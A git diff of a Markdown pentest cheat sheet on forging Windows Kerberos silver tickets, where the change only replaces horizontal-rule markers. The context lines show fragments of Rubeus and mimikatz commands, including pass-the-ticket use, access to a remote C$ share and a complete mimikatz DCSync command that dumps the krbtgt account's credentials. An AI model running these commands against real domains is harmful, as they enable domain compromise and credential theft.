@@ -18,7 +18,7 @@ linked:
 
 # Silver Ticket - Forging Windows
 
-***
+---
 
 ## Rubeus silver — RC4
 
@@ -44,7 +44,7 @@ klist
 dir \\web01.corp.local\c$
 ```
 
-___
+---
 
 ## Rubeus silver — AES256 (OPSEC)
 
@@ -66,7 +66,7 @@ ___
   /ptt /opsec
 ```
 
-___
+---
 
 ## Rubeus silver — flags avanzados
 
@@ -92,7 +92,7 @@ ___
   /ldap /ptt
 ```
 
-___
+---
 
 ## mimikatz kerberos::golden (silver mode)
 
@@ -112,7 +112,7 @@ mimikatz # misc::cmd
 dir \\web01.corp.local\c$
 ```
 
-___
+---
 
 ## DCSync via Silver Ticket (LDAP, on-host)
 
@@ -131,4 +131,4 @@ klist
 .\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
 ```
 
-***
+---
